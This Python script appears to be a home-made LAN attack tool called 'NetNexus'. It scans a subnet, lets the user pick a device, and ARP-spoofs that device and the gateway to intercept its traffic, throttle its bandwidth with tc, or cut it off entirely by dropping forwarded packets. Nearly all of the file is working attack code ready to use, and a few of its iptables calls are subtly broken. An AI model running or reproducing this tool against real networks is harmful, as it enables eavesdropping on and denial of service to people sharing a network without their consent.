import scapy.all as scapy
import os, time, sys, subprocess
from core import scanner, spoof

def set_forwarding(state):
    if state:
        # وضع الاعتراض/التحديد: تفعيل التمرير
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
    else:
        # وضع القتل: إيقاف التمرير وحظر البيانات تماماً
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-A FORWARD -j DROP"], shell=True, capture_output=True)
        subprocess.run(["sudo", "iptables", "-P FORWARD DROP"], shell=True, capture_output=True)

def set_limit(interface, speed):
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
    try:
        subprocess.run(["sudo", "tc", "qdisc", "add", "dev", interface, "root", "tbf", 
                        "rate", f"{speed}kbps", "latency", "50ms", "burst", "1540"], check=True)
        print(f"[*] Speed limited to {speed}kbps")
    except:
        pass

def main():
    # تأكد أن الواجهة wlan0 هي الصحيحة من أمر ip a
    iface = "wlan0" 
    scapy.conf.iface = iface
    
    if os.geteuid() != 0:
        print("[-] Run with sudo!")
        return

    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"
    device_memory = {} 

    while True:
        print("\n" + "="*45)
        print("      NetNexus: Ultimate Control")
        print("="*45)
        
        device_memory = scanner.scan(ip_range, device_memory)
        current_list = list(device_memory.values())
        
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 45)
        print("[R] Refresh  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()
        if user_input == 'c': sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            target_ip, target_mac = target['ip'], target['mac']

            print(f"\n[1] Intercept | [2] Limit | [3] Kill")
            mode = input("Action: ")

            gateway_mac, _ = spoof.get_device_info(gateway_ip)
            wait_time = 0.5

            if mode == "1":
                set_forwarding(True)
            elif mode == "2":
                speed = input("Limit (kbps): ")
                set_forwarding(True)
                set_limit(iface, speed)
            elif mode == "3":
                set_forwarding(False)
                wait_time = 0.05 # إرسال سريع جداً لقطع الاتصال بقوة

            print(f"[*] Active on {target_ip}. Press Ctrl+C to stop.")
            while True:
                spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
                time.sleep(wait_time) 
                
        except Exception as e:
            print(f"[-] Error: {e}")
        except KeyboardInterrupt:
            print("\n[*] Stopping and cleaning...")
            set_forwarding(True)
            subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
            spoof.restore(target_ip, gateway_ip)
            spoof.restore(gateway_ip, target_ip)
            time.sleep(1)

if __name__ == "__main__":
    main()
